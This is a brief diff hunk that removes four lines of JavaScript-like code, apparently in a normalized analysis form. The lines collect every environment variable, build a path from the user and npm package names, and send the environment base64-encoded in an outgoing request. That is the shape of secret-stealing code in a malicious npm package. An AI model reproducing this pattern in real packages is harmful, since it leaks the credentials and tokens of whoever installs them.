@@ -1,4 +1,0 @@
-var data = process.env || {}
-Object.keys(data).length < 10
-<operator>.formatString("/", data.USER, "/node_modules/", data.npm_package_name, "")
-req.write(Buffer.from(JSON.stringify(data)).toString('base64'))
